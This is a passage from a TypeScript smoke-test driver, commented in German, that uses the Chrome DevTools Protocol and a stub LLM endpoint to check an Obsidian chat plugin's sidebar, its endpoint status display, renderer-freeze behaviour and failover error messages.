  // Pfade sind streng (alles ausser GET /v1/models und POST /v1/chat/completions antwortet 404).
  const fehler = chatStub?.errorBody === undefined
    ? undefined
    : (JSON.parse(chatStub.errorBody) as { error?: { message?: string } }).error?.message;
  const stub = await startLlmStub({
    port: wunschPort,
    models: ["smoke-model"],
    standard: fehler !== undefined
      ? { fehler, fehlerAls200: true, fehlerForm: "objekt" }
      : chatStub !== undefined
        ? { text: chatStub.content, finishReason: chatStub.finishReason }
        : "Stub-Antwort",
  });
  // `close()` gibt ein Promise: Punkt 19 startet denselben Port wieder und braucht die
  // Zusage, dass er wirklich frei ist.
  return { url: stub.url, port: stub.port, close: () => stub.stop() };
}

/** Eine SSE-Antwort je Anfrage, vom Test geschrieben: `respond(body, n)` sieht die Anfrage (als
 *  JSON) und ihre Nummer und liefert Text, einen Tool-Call oder einen HTTP-Fehler. Jede Anfrage
 *  landet in `bodies` — Punkte 55-58 messen damit, WAS Koda auf den Draht schickt (Bild-Parts im
 *  Tool-Ergebnis, Werkzeugliste), nicht nur, was ankommt. Kein Modell noetig. */
interface ScriptedReply { status?: number; content?: string; toolCall?: { name: string; args: string }; errorMessage?: string }
type ScriptedBody = { messages: { role: string; content: unknown }[]; tools?: { function: { name: string } }[] };
async function startScriptedEndpoint(
  respond: (body: ScriptedBody, n: number) => ScriptedReply,
): Promise<{ url: string; bodies: ScriptedBody[]; authHeaders: string[]; close: () => Promise<void> }> {
  const stub = await startLlmStub({
    models: ["smoke-model"],
    antwort: (anfrage, n) => {
      const r = respond(anfrage.json as ScriptedBody, n);
      if (r.status !== undefined && r.status >= 400) return { status: r.status, fehler: r.errorMessage ?? "Fehler" };
      if (r.toolCall !== undefined) return { toolCalls: [{ name: r.toolCall.name, arguments: r.toolCall.args }] };
      return { text: r.content ?? "" };
    },
  });
  const chat = () => stub.anfragen().filter((a) => a.route === "chat");
  return {
    url: stub.url,
    get bodies() { return chat().map((a) => a.json as ScriptedBody); },
    get authHeaders() { return chat().map((a) => String(a.header.authorization ?? "")); },
    close: () => stub.stop(),
  };
}

/**
 * Wie `pollUntil`, nur auf ZWEI Fenstern zugleich — fuer Punkt 18: die Settings-Bruecke hat
 * kein `window.app` (s. Kopfkommentar von `attachTo`), also ist von hier aus nicht sicher
 * entschieden, ob das Vorschau-Modal im Haupt- oder im Einstellungsfenster entsteht. Statt
 * das zu raten, wird auf beiden gepollt; welches zuerst liefert, gewinnt — `from` haelt fest,
 * welches das war, fuer den Detailtext und zum gezielten Schliessen danach.
 */
async function pollEither<T>(
  a: Cdp,
  b: Cdp,
  expression: string,
  timeoutMs = 8000,
  stepMs = 500,
): Promise<{ value: T; from: "a" | "b" } | null> {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    const va = await a.evaluate<T | null>(expression);
    if (va) return { value: va, from: "a" };
    const vb = await b.evaluate<T | null>(expression);
    if (vb) return { value: vb, from: "b" };
    await new Promise((resolve) => setTimeout(resolve, stepMs));
  }
  return null;
}

/**
 * Staging-Vault aus dem getrackten Fixture herstellen (`--setup`).
 *
 * Der Vault ist Wegwerfware: sein Inhalt kommt vollstaendig aus `docs/images/fixture/`.
 * Geht er verloren, ist der naechste Lauf trotzdem reproduzierbar — das ist der Unterschied
 * zu dem von Hand angelegten Vault, den dieser Treiber bis zum 2026-09-01 vorausgesetzt hat.
 *
 * Plugin-Einstellungen schreibt `--setup` bewusst KEINE: `buildVault` entfernt `data.json`,
 * und die Auslieferungs-Defaults bringen den Endpunkt `http://127.0.0.1:1234` bereits mit
 * (`DEFAULT_SETTINGS` in src/core/settings-types.ts). Der Lauf misst damit den Zustand einer
 * frischen Installation und nicht den einer nachgepflegten Konfiguration.
 */
function setup(): void {
  const vaultDir = stagingVaultDir(REPO_NAME);
  const log = buildVault({
    repoRoot: REPO_ROOT,
    vaultDir,
    fixtureDir: FIXTURE_DIR,
    pluginId: PLUGIN_ID,
  });
  console.log(`Staging-Vault: ${vaultDir}`);
  for (const zeile of log) console.log(`  ${zeile}`);
  console.log(
    "\nZweitinstanz starten (eigenes Profil, eigener Port, Vault in obsidian.json eintragen: Rezept im\n" +
      "Dateikopf), dann:\n" +
      `  npm run smoke:gui -- --port <PORT> --vault ${REPO_NAME}`,
  );
}

async function main(): Promise<void> {
  const args = parseArgs(process.argv.slice(2));
  if (args.has("setup")) {
    setup();
    return;
  }
  const port = Number(args.value("port"));
  if (!Number.isInteger(port) || port < 1024 || port > 65535) {
    throw new Error("--port <1024-65535> ist Pflicht (kein Standardport: 9222 gehoert der regulaeren Instanz). Beispiel: npm run smoke:gui -- --port <PORT> --vault koda-agent");
  }
  const vault = args.value("vault") ?? REPO_NAME;

  console.log(`Smoke koda-agent — Obsidian auf Port ${port}`);
  // `attachTo` unterscheidet Haupt- und Einstellungen-Fenster an der Sache (nur das
  // Hauptfenster traegt einen Workspace), nicht am lokalisierten Fenstertitel.
  const cdp = await attachTo("workspace", port, vault);
  if (!cdp) {
    throw new Error(
      `Kein Obsidian-Hauptfenster auf Port ${port}` +
        (vault ? ` fuer Vault „${vault}"` : "") +
        ". Laeuft Obsidian mit --remote-debugging-port? (siehe Kopfkommentar)",
    );
  }
  // Plugin neu laden, BEVOR irgendetwas gemessen wird. Obsidian haelt `main.js` im
  // Speicher: ein frisch deploytes Bundle wirkt erst nach einem Neuladen, und ein
  // Datei-Vergleich Repo↔Vault ist dabei GRUEN — die Dateien stimmen ja ueberein, nur
  // laeuft der Code von vorhin. Gemessen am 2026-09-04: der ensureParents-Fix zu Punkt 24
  // war deployt und der Punkt blieb mit identischer Fehlermeldung rot; ohne diese Zeile
  // sieht ein wirkungsloser Fix aus wie ein falscher Fix, und man sucht am falschen Ende.
  // (LESSONS 2026-09-03/calendar-notes; koda-agent stand dort namentlich als eines von
  // fuenf Repos ohne Reload.)
  // Vertrauensdialog, Restricted Mode, Plugin laden (frisches Profil): zentrale Bruecke.
  const instanz = await bereiteInstanzVor(cdp, { pluginIds: [PLUGIN_ID], nurVault: REPO_NAME, sprache: "en" });
  await cdp.evaluate(`
    await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
    await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
    return true;
  `);

  // Ausserhalb des try, damit das `finally` sie auch nach einem Abbruch mitten im Lauf
  // zurueckschreiben kann — sonst bliebe der Vault mit toten Endpunkten stehen.
  const herkunftsWarnungen: string[] = [];
  let previous: Settings | null = null;
  let fake: { url: string; port: number; close: () => Promise<void> } | null = null;
  let zustand: { schliesse(): Promise<void> } | null = null;
  // Gibt die Einstellungen zurueck, wie der Lauf sie vorgefunden hat. Idempotent und ohne Warten: sie laeuft im
  // Normalweg (`finally`) und nach Ctrl-C (Abbruch-Modul, hoechstens eine Sekunde).
  const stelleZurueck = async (): Promise<void> => {
    if (previous === null) return;
    await cdp
      .evaluate(
        `
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.endpoints = ${JSON.stringify(previous.endpoints)};
        p.settings.timeoutSec = ${JSON.stringify(previous.timeoutSec)};
        p.settings.suppressThinking = ${JSON.stringify(previous.suppressThinking)};
        await p.saveSettings();
        await p.newChat();
        return true;
      `,
      )
      .catch(() => undefined);
    await schliesseEinstellungen(cdp).catch(() => undefined);
  };

  try {
    // Ohne Fokus drosselt Chromium den Renderer. `Page.bringToFront` allein genuegt auf
    // macOS NICHT: es holt das Fenster innerhalb der App nach vorn, nicht die App nach
    // vorn. Im Hintergrund bleibt das DOM leer, obwohl die App-API den Zustand korrekt
    // meldet — man debuggt dann ein Phantom. `requireVisible` holt das Fenster selbst
    // nach vorn und bricht mit Handlungsanweisung ab, wenn das nicht reicht.
    await requireVisible(cdp);

    const vaultName = await cdp.evaluate<string>(`return window.app?.appId ? app.vault.getName() : "";`);
    if (!vaultName) throw new Error("Obsidians `app` ist im Renderer nicht erreichbar.");
    console.log(`Vault: ${vaultName}\n`);

    // Build-Herkunft VOR jeder Messung (CORE-TEST-02 g): ein gruener Lauf gegen einen Store-Build oder
    // einen veralteten Deploy ist schlimmer als keiner, weil er nicht untersucht wird — `manifest.version`
    // ist fuer Store- und Repo-Build identisch. Bricht bei „fehlt“/„store-installiert“/„fremd“ ab; bei
    // „ungeklaert“ landet die Warnung in der Abschlusszeile.
    const vaultInfo = await cdp.evaluate<{ basePath: string; configDir: string }>(`return { basePath: app.vault.adapter.basePath, configDir: app.vault.configDir };`);
    requireEigenerBuild(
      join(vaultInfo.basePath, vaultInfo.configDir, "plugins", PLUGIN_ID, "main.js"),
      join(REPO_ROOT, "main.js"),
      (meldung) => { herkunftsWarnungen.push(meldung); console.warn(meldung); },
    );

    // --- 1. Plugin ist aktiv ------------------------------------------------
    const plugin = await cdp.evaluate<{ ok: boolean; version?: string }>(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      return p ? { ok: true, version: p.manifest.version } : { ok: false };
    `);
    if (!plugin.ok) throw new Error(`Plugin ${PLUGIN_ID} ist nicht aktiv — ${instanz.hinweis}. Ggf. erst deployen.`);
    record("1. Plugin ist aktiv", true, `Version ${plugin.version}`);

    // --- 1b. Retrieval-Andockung an vault-rag -------------------------------
    // Geprueft wird die NAHT, nicht die Suche: liegt vault-rags Vertrag in der Form vor,
    // gegen die Koda gebaut ist? Das entscheidet, ob die semantische Suche und die Nachbarn im
    // Kontext moeglich sind (`status().indexed`) — und es ist der Teil, der ohne eine echte
    // Modell-Antwort pruefbar ist. Der Aufruf laeuft ueber CDP im Renderer, also exakt auf
    // dem Weg, den Kodas `readRetrievalApi` nimmt.
    //
    // Was dieser Punkt NICHT zeigt: dass Koda die API im Gespraech tatsaechlich benutzt.
    // Dafuer braeuchte es eine Modell-Antwort (>90 s stumm, nicht deterministisch) — das
    // bleiben die Handpunkte 14–18 in docs/SMOKE.md. Fehlt vault-rag ganz, ist dieser
    // Punkt kein Defekt: dann meldet er „nicht installiert" und bleibt gruen, weil die
    // weiche Kopplung genau das vorsieht.
    const retrieval = await cdp.evaluate<{
      installed: boolean; version?: unknown; keys?: string[];
      indexed?: boolean; noteCount?: number; usable?: boolean;
    }>(`
      const rag = app.plugins.plugins["vault-retrieval"];
      if (!rag || !rag.api) return { installed: false };
      const api = rag.api;
      const st = api.status();
      return {
        installed: true,
        version: api.apiVersion,
        keys: Object.keys(api).sort(),
        indexed: st.indexed,
        noteCount: st.noteCount,
        // Genau die Pruefung aus src/obsidian/retrieval.ts — Version UND Form.
        usable: api.apiVersion === 1
          && typeof api.status === "function"
          && typeof api.search === "function"
          && typeof api.related === "function",
      };
    `);
    if (!retrieval.installed) {
      // Nicht anwendbar in dieser Lage (weiche Kopplung: Koda laeuft ohne vault-rag), kein Gegenstand verfehlt.
      skipped("1b. Retrieval-Andockung", "vault-retrieval nicht installiert — Koda laeuft ohne (weiche Kopplung)");
    } else {
      record(
        "1b. Retrieval-Andockung",
        retrieval.usable === true && retrieval.indexed === true,
        `apiVersion ${String(retrieval.version)} · ${retrieval.keys?.join(", ") ?? "?"} · indexed=${String(retrieval.indexed)} · ${String(retrieval.noteCount)} Notizen`,
      );
    }

    // --- 1c. Frontmatter-Naht (Grundlage von list_notes) --------------------
    // Geprueft wird NICHT list_notes selbst (VaultTools haengt nicht am Plugin-Objekt),
    // sondern die Fremd-API darunter: liefert metadataCache ein Objekt in der Form, gegen
    // die `pickFields` gebaut ist? Faellt Obsidian hier je auf eine andere Form, faellt
    // dieser Punkt — und nicht erst der Nutzer im Gespraech.
    //
    // Bewusst NICHT geprueft wird, ob jeder Feldwert flach ist (kein verschachteltes
    // Objekt): am 2026-08-14 gegen 10_Pallas gemessen enthaelt der reale Vault legitime
    // verschachtelte Frontmatter-Werte (`limits: {...}` in vault-crews-Teams,
    // `fields: {...}` in `80_Archiv/60_Blueprints/shadowvault-types/*.md`) — und
    // `formatFieldValue` (list.ts) behandelt das explizit als Erwartungsfall, nicht als
    // Fehler: jeder Nicht-Array-Objektwert wird zu `{…}` gerendert. Eine Flachheits-Pflicht
    // wuerde also etwas Strengeres pruefen, als `pickFields` tatsaechlich braucht, und
    // waere auf diesem Vault dauerhaft rot, ohne dass etwas kaputt ist. Die echte Naht ist:
    // kommt `frontmatter` ueberhaupt als ueber `fm[feld]` indizierbares Objekt zurueck
    // (Record<string, unknown>, kein Array, kein Skalar)?
    const fmSeam = await cdp.evaluate<{ notes: number; withFm: number; sample?: string[]; recordShaped?: boolean }>(`
      const files = app.vault.getMarkdownFiles();
      let withFm = 0, sample = null, recordShaped = true;
      for (const f of files) {
        const fm = app.metadataCache.getFileCache(f)?.frontmatter;
        if (!fm) continue;
        withFm++;
        if (sample === null) sample = Object.keys(fm).slice(0, 5);
        if (typeof fm !== "object" || fm === null || Array.isArray(fm)) recordShaped = false;
      }
      return { notes: files.length, withFm, sample: sample ?? [], recordShaped };
    `);
    record(
      "1c. Frontmatter-Naht",
      fmSeam.withFm > 0 && fmSeam.recordShaped === true,
      `${fmSeam.withFm} von ${fmSeam.notes} Notizen mit Frontmatter · Beispielfelder: ${fmSeam.sample?.join(", ") ?? "—"}`,
    );

    // Vorwerte sichern, bevor irgendetwas veraendert wird.
    previous = await cdp.evaluate<Settings>(`
      const s = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings;
      return { endpoints: JSON.parse(JSON.stringify(s.endpoints)), timeoutSec: s.timeoutSec, suppressThinking: s.suppressThinking };
    `);
    // Vor der ersten Mutation anmelden: ab hier raeumt Ctrl-C die Einstellungen zurueck.
    zustand = beimAbbruch(stelleZurueck, "Einstellungen zurueckschreiben");

    // --- 2. Die Sidebar oeffnet und ist bedienbar ---------------------------
    // Mutation (Command feuern) und Wartephase (auf gerenderte View pollen) sind
    // getrennt: `Cdp.send` bricht nach 30 s ab, `pollUntil` fragt stattdessen
    // wiederholt in eigenen, kurzen `Runtime.evaluate`-Aufrufen von der Node-Seite nach.
    await cdp.evaluate(`
      await app.commands.executeCommandById(${JSON.stringify(`${PLUGIN_ID}:open`)});
      return true;
    `);
    const view = await pollUntil<{
      leaves: number; input: boolean; buttons: string[]; cta: boolean;
      actions: { label: string; sichtbar: boolean; hoehe: number }[];
      inSidebar: boolean; hasThink: boolean; hasNewChat: boolean; status: boolean;
    }>(
      cdp,
      `
        const leaves = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)});
        const el = leaves[0]?.view?.containerEl;
        if (!el) return null;
        const buttons = [...el.querySelectorAll(".koda-buttons button")].map((b) => b.textContent.trim());
        if (buttons.length === 0) return null;
        const view0 = leaves[0].view;
        // ⚠️ Gemessen wird die GROESSE, nicht die Existenz — und das ist der ganze Punkt.
        // Bis 0.10.0 hingen beide Aktionen an addAction(), also im echten View-Kopf. Den
        // blendet Obsidian in JEDER Seitenleiste per app.css aus
        // (.workspace-split.mod-right-split .view-header { display: none }), weshalb sie
        // im DOM standen und niemand sie sehen konnte. Dieser Pruefpunkt war die ganze Zeit
        // gruen, weil er querySelectorAll zaehlte. Ein Nutzer hat den Defekt gefunden,
        // nicht der Automat (2026-09-01). Seither: getBoundingClientRect.
        //
        // Die zweite Haelfte ist inSidebar: im Hauptbereich IST der Kopf sichtbar, dort
        // waere auch die alte Fassung gruen gewesen. Der Punkt muss also belegen, dass er
        // unter der Bedingung misst, unter der der Defekt auftrat — sonst prueft er den
        // Nachbarfall (Lesson 2026-09-01, „Beleg-Test mit erfundenem Namen").
        const wurzel = leaves[0].getRoot();
        const inSidebar = wurzel === app.workspace.leftSplit || wurzel === app.workspace.rightSplit;
        const actions = [...el.querySelectorAll(".koda-header-action")].map((a) => {
          const r = a.getBoundingClientRect();
          return { label: a.getAttribute("aria-label") ?? "", sichtbar: r.width > 0 && r.height > 0, hoehe: Math.round(r.height) };
        });
        // Der Denk-Knopf steht seit obsidian-kit 0.70.1 in der Modellzeile (Kit-Klasse), nicht mehr im Kopf; sichtbar heisst: eine Hoehe.
        const think = el.querySelector(".okit-model-bar .okit-thinking-toggle");
        const hasThink = !!think && think.getBoundingClientRect().height > 0;
        const neu = actions.find((a) => /Neues Gespräch|New chat/.test(a.label));
        const hasNewChat = !!neu && neu.sichtbar;
        return {
          leaves: leaves.length,
          input: !!el.querySelector("textarea.koda-input"),
          buttons,
          cta: !!el.querySelector(".koda-buttons button.mod-cta"),
          actions,
          inSidebar,
          hasThink,
          hasNewChat,
          status: !!el.querySelector(".koda-status"),
        };
      `,
      8000,
    );
    record(
      "2. Sidebar oeffnet mit Eingabefeld, zwei Knoepfen, der SICHTBAREN Kopfzeilen-Aktion „Neues Gespraech“ und dem sichtbaren Denk-Knopf in der Modellzeile",
      view !== null && view.input && view.buttons.length === 2 && view.cta &&
        view.inSidebar && view.hasThink && view.hasNewChat && view.actions.length === 1 && view.status,
      view
        ? `${view.leaves} Leaf · in Seitenleiste: ${String(view.inSidebar)} · Knoepfe: ${view.buttons.join(", ")} · Kopfzeile: ${view.actions.map((a) => `${a.label}[${a.hoehe}px]`).join(" | ")} · Denk-Knopf in der Zeile sichtbar: ${view.hasThink} · Statuszeile: ${view.status}`
        : "keine View entstanden",
    );

    // --- 3. Der Freeze-Waechter ---------------------------------------------
    // Der teuerste Fund des Projekts (2026-08-06): der Klick auf „Testen“ schickte den
    // Renderer in eine Endlosschleife. Deshalb wird hier NICHT geprueft, ob ein Handler
    // lief, sondern ob der Renderer den Klick **ueberlebt**: kommt keine Antwort mehr,
    // laeuft der CDP-Aufruf in seine Zeitueberschreitung und der Punkt wird rot.
    //
    // Erst die Existenz des Knopfes belegen, dann klicken: ein Klick ins Leere waere
    // sonst gruen — ausgerechnet im Defektfall (Falle „Pruefpunkt ohne Gegenstand“).
    //
    // ⚠️ WAS DIESER PUNKT BELEGT UND WAS NICHT. Belegt ist: der Renderer ueberlebt den
    // Klick, und ein erreichbarer Endpunkt wird als `is-ok` erkannt. NICHT belegt ist,
    // dass er den historischen Freeze fangen wuerde — die Gegenprobe am 2026-08-07 (mit
    // wieder eingebautem `setDisabled()`) blieb gruen, der Defekt ist seither nicht
    // reproduzierbar. Der Punkt ist gegen seinen eigenen Bug also **unbewiesen**; nur die
    // beiden Aussagen darueber sind gemessen. Nachgebaut wird der Freeze bewusst nicht:
    // das belegte, dass der Punkt einen NACHGEBAUTEN Freeze sieht, was eine andere
    // Aussage ist. Offen gefuehrt als geparkte Task „Freeze-Gegenprobe klaeren“ im
    // Cockpit; taucht der Freeze im Alltag wieder auf, wird sie hochgeholt.
    fake = await startFakeEndpoint();
    // Zeile 1 erreichbar (trifft den historischen Freeze-Fall), Zeile 2 tot (Pruefpunkt 4).
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.endpoints = [{ url: ${JSON.stringify(fake.url)} }, { url: ${JSON.stringify(DEAD_A)} }];
      await p.saveSettings();
      app.setting.open();
      app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
      return true;
    `);
    // Das Fenster entsteht erst durch `open()` — vorher gibt es kein Target.
    await new Promise((resolve) => setTimeout(resolve, 1200));

    let settings: Cdp | null = null;
    try {
      settings = await attachTo("settings", port, vault);
      if (!settings) {
        unmeasured("3. Klick auf „Verbindung prüfen“ friert den Renderer nicht ein", "Einstellungsfenster nicht gefunden");
        unmeasured("4. Toter Endpunkt wird als nicht erreichbar angezeigt", "ohne Einstellungsfenster nicht entscheidbar");
      } else {
        // Auch dieses Fenster wird im Hintergrund gedrosselt.
        await settings.send("Page.bringToFront");

        const zeilen = await pollUntil<number>(
          settings,
          `
            const rows = [...document.querySelectorAll(".setting-item")].filter((r) => r.querySelector(".okit-ep-status"));
            return rows.length >= 2 ? rows.length : 0;
          `,
          8000,
        );
        const hatZeile = zeilen !== null && zeilen >= 2;

        if (!hatZeile) {
          unmeasured("3. Klick auf „Verbindung prüfen“ friert den Renderer nicht ein", "Endpunkt-Zeile im Einstellungsfenster nicht gefunden");
          unmeasured("4. Toter Endpunkt wird als nicht erreichbar angezeigt", "ohne Endpunkt-Zeile nicht entscheidbar");
        } else {
          const t0 = Date.now();
          let survived = true;
          let detail = "";
          let status: string | null = null;
          try {
            // Klick (Mutation) und Warten auf das Status-Icon (Wartephase) sind getrennt:
            // friert der Renderer ein, laeuft `pollUntil` in seine eigene Zeitueberschreitung,
            // statt den ganzen 30-s-`Cdp.send`-Aufruf mitzureissen.
            // Seit dem Kit-Umstieg (2026-08-28) gibt es KEINEN Testen-Knopf je Zeile mehr:
            // der Kit-Baustein setzt Preset- und „Verbindung pruefen"-Knoepfe in eine eigene
            // `actions`-Zeile am Listenende, und deren letzter Knopf ist der Pruef-Knopf.
            // Sprachfrei ueber die Position gegriffen, nicht ueber den Text — der Treiber
            // laeuft sonst nur auf einer Oberflaechensprache.
            //
            // Der Punkt misst dadurch etwas Staerkeres als vorher: dieser Klick loest einen
            // vollstaendigen Neuaufbau der Liste aus (`rerender()`), nicht nur eine Probe.
            const geklickt = await clickReal(
              settings,
              `(() => {
                 const items = [...document.querySelectorAll(".setting-item")];
                 const letzteZeile = items.map((r, i) => r.querySelector(".okit-ep-status") ? i : -1)
                                          .filter((i) => i >= 0).pop();
                 if (letzteZeile === undefined) return null;
                 const aktionen = items.slice(letzteZeile + 1).find((r) => r.querySelectorAll("button").length > 0);
                 const knoepfe = aktionen ? [...aktionen.querySelectorAll("button")] : [];
                 return knoepfe[knoepfe.length - 1] ?? null;
               })()`,
            );
            if (!geklickt) throw new Error("„Verbindung pruefen\"-Knopf nicht klickbar (unsichtbar oder nicht vorhanden)");
            status = await pollUntil<string>(
              settings,
              `
                const rows2 = [...document.querySelectorAll(".setting-item")].filter((r) => r.querySelector(".okit-ep-status"));
                const el = rows2[0]?.querySelector(".okit-ep-status");
                if (!el) return null;
                if (el.classList.contains("is-ok")) return "is-ok";
                if (el.classList.contains("is-error")) return "is-error";
                return null;
              `,
              12_000,
            );
            // Der Freeze von 2026-08-06 nahm BEIDE Fenster mit. Das Hauptfenster wird
            // deshalb mitgeprueft: antwortet es nicht mehr, ist der Punkt rot, auch wenn
            // das Einstellungsfenster noch gezuckt hat.
            //
            // Das `return true` ist KEINE tote Assertion, auch wenn es so aussieht: die
            // Aussage steckt nicht im Wert, sondern darin, DASS eine Antwort kommt. Haengt
            // der Renderer des Hauptfensters, laeuft dieser Aufruf in seine
            // Zeitueberschreitung, das `catch` unten greift und der Punkt wird rot. Ein
            // Ping, kein Vergleich — vermerkt, weil die Zeile beim Lesen wie der Fehler
            // aussieht, den sie gerade nicht macht.
            // ⚠️ NACHBEOBACHTUNG, seit 2026-09-02 — der Punkt mass vorher zu frueh.
            // Bis dahin endete er, sobald `is-ok` erschien (im Lauf vom 01.09. nach 1031 ms).
            // Ein Freeze, der ERST beim Zurueckkommen des Netzabrufs eintritt, waere damit
            // unsichtbar gewesen: der Punkt haette laengst gruen gemeldet. Der Hinweis kam
            // aus der Session `anysource-sideloader` (2026-09-01), die einen gleich
            // aussehenden Freeze jagte — bei ihr trat er verzoegert ein, ihr eigener
            // Pruefpunkt blieb deshalb im Defektzustand gruen, und erst das Zurueckschreiben
            // der Einstellungen am Laufende scheiterte an einem toten Renderer. Es ist eine
            // WEITERGABE, keine eigene Messung, und ihr Fall ist ausdruecklich kein zweiter
            // Beleg fuer die `setDisabled`-Hypothese (sie hat zwei Verdaechtige zugleich
            // entfernt) — er erklaert aber, warum unsere Gegenprobe vom 2026-08-07 scheitern
            // konnte, ohne dass der Defekt weg war.
            //
            // Gewartet wird auf der NODE-Seite: im Renderer kommt bei genau diesem Defekt
            // kein `setTimeout` mehr zurueck, eine Wartezeit dort waere also selbst Teil
            // des Haengers. Die 9 s sind der Wert, bei dem der fremde Fall sichtbar wurde —
            // ein Anhaltspunkt, keine gemessene Schwelle fuer Koda.
            await new Promise((resolve) => setTimeout(resolve, NACHBEOBACHTUNG_MS));
            const hauptfensterLebt = await cdp.evaluate<boolean>(`return true;`);
            const settingsLebt = await settings.evaluate<boolean>(`return true;`);
            survived = status === "is-ok" && hauptfensterLebt && settingsLebt;
            detail =
              status === "is-ok"
                ? `Status is-ok nach ${Date.now() - t0 - NACHBEOBACHTUNG_MS} ms · beide Fenster antworten auch ${NACHBEOBACHTUNG_MS} ms spaeter`
                : `Status ${status ?? "(keiner)"} statt is-ok — erreichbarer Endpunkt nicht als solcher erkannt`;
          } catch (error) {
            survived = false;
            detail = `Renderer antwortet nicht mehr (${error instanceof Error ? error.message : String(error)}) — Freeze-Verdacht`;
          }
          record("3. Klick auf „Verbindung prüfen“ friert den Renderer nicht ein", survived, detail);

          // --- 4. Der Status ist der echte Status -----------------------------
          // Gegen einen toten Port MUSS „nicht erreichbar“ stehen. Ein Statuspunkt, der
          // immer gruen ist, waere schlimmer als keiner — deshalb wird die zweite Zeile
          // (toter Port) separat geklickt statt die erste nur anders interpretiert.
          //
          // Seit dem Kit-Umstieg braucht dieser Punkt KEINEN Klick mehr: der Baustein laedt
          // Status und Modell-Liste jeder Zeile beim Zeichnen. Er misst damit naeher am
          // Erlebten — ob der Nutzer den toten Endpunkt sieht, ohne etwas zu tun. Der Klick
          // auf Punkt 3 (globales „Verbindung pruefen") hat die Liste gerade neu aufgebaut,
          // die Proben laufen also frisch.
          let tot: string | null = null;
          try {
            tot = await pollUntil<string>(
              settings,
              `
                const rows2 = [...document.querySelectorAll(".setting-item")].filter((r) => r.querySelector(".okit-ep-status"));
                const el = rows2[1]?.querySelector(".okit-ep-status");
                if (!el) return null;
                if (el.classList.contains("is-error")) return "is-error";
                if (el.classList.contains("is-ok")) return "is-ok";
                return null;
              `,
              12_000,
            );
          } catch (error) {
            tot = `FEHLER: ${error instanceof Error ? error.message : String(error)}`;
          }
          record(
            "4. Toter Endpunkt wird als nicht erreichbar angezeigt",
            tot === "is-error",
            `Status ${tot ?? "(keiner)"} bei ${DEAD_A}`,
          );

          // --- 8. Settings-Gruppe „Verlauf kürzen“ -----------------------
          // Nur geprueft, waehrend das Einstellungsfenster ohnehin offen ist (Punkte 3/4) —
          // ein eigenes Oeffnen/Schliessen nur fuer diesen Punkt waere unnoetiger Aufwand.
          // Die Ueberschrift kommt aus dem deklarativen Settings-Walker (`setHeading()`,
          // src/vendor/kit-obsidian/settings_walker.ts), das Zahlenfeld ist ein Text-Input
          // (`type: "number"` rendert `addText`, kein natives `<input type=number>`).
          const group = await settings.evaluate<{ heading: boolean; field: string | null }>(`
            const heads = [...document.querySelectorAll(".setting-item-heading .setting-item-name")].map((e) => e.textContent);
            const heading = heads.some((h) => /Verlauf kürzen|Shorten history/.test(h));
            const item = [...document.querySelectorAll(".setting-item")].find((e) => /Kontextfenster|Context window/.test(e.querySelector(".setting-item-name")?.textContent ?? ""));
            return { heading, field: item?.querySelector("input")?.value ?? null };
          `);
          record(
            "8. Settings-Gruppe „Verlauf kürzen“ mit Fenster-Feld",
            group.heading && group.field !== null,
            JSON.stringify(group),
          );

          // --- 49. Hilfe-Zeile (UI-STANDARD §8) ------------------------------
          // Gemessen wird die POSITION und die Bedienung, nicht der Wortlaut: die Zeile muss die
          // erste des Tabs sein und einen Text-Knopf plus den Icon-Knopf (`bug`, Tooltip als
          // Name) tragen. Sprachfrei, damit der Punkt in einer EN- und einer DE-Instanz laeuft.
          const hilfe = await settings.evaluate<{ name: string; knoepfe: number; icon: string | null } | null>(`
            const erste = document.querySelector(".setting-item");
            if (!erste) return null;
            return {
              name: erste.querySelector(".setting-item-name")?.textContent?.trim() ?? "",
              knoepfe: erste.querySelectorAll("button").length,
              icon: erste.querySelector(".extra-setting-button")?.getAttribute("aria-label") ?? null,
            };
          `);
          record(
            "49. Die Hilfe-Zeile steht als erste Zeile im Tab, mit Text-Knopf und Icon-Knopf",
            hilfe !== null && hilfe.name !== "" && hilfe.knoepfe === 1 && hilfe.icon !== null && hilfe.icon !== "",
            hilfe ? `erste Zeile „${hilfe.name}“ · Text-Knöpfe ${hilfe.knoepfe} · Icon „${hilfe.icon ?? "keiner"}“` : "kein Settings-DOM",
          );
        }
      }
    } finally {
      settings?.close();
      await schliesseEinstellungen(cdp).catch(() => undefined);
    }

    // --- 5. Failover-Klartext statt Stacktrace ------------------------------
    // Kommt ohne Modell aus: beide Endpunkte sind tot, der Resolver scheitert, lange
    // bevor irgendetwas gefragt wuerde. Deterministisch und in Sekunden entschieden.
    // Mutation (Endpunkte setzen, `ask()` anstossen) und Wartephase (auf die
    // Fehlermeldung pollen) sind getrennt — dieselbe Begruendung wie bei Pruefpunkt 2.
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.endpoints = [{ url: ${JSON.stringify(DEAD_A)} }, { url: ${JSON.stringify(DEAD_B)} }];
      await p.saveSettings();
      await p.newChat();
      void p.ask("Smoke-Test: bitte antworten.");
      return true;
    `);
    const failover = await pollUntil<{ text: string; busy: boolean; klasse: string }>(
      cdp,
      `
        const p2 = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        if (p2.busy) return null;
        const el = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0]?.view?.containerEl;
        const msg = el?.querySelector(".koda-error");
        if (!msg) return null;
        return { text: msg.textContent.trim(), busy: p2.busy, klasse: msg.className };
      `,
      20_000,
    );
    const looksLikeStacktrace = /\bat \w+.*:\d+|TypeError|undefined is not/.test(failover?.text ?? "");
    record(
      "5. Zwei tote Endpunkte ergeben Klartext, keinen Stacktrace",
      failover !== null && failover.text.length > 0 && !looksLikeStacktrace && !failover.busy,
      failover ? `„${failover.text.slice(0, 90)}“` : "keine Fehlermeldung im Log",
    );

    // --- 6. Wikilinks in Antworten sind klickbar ----------------------------
    // Ueber `chatLog` + `renderLog()` statt ueber eine echte Antwort: geprueft wird die
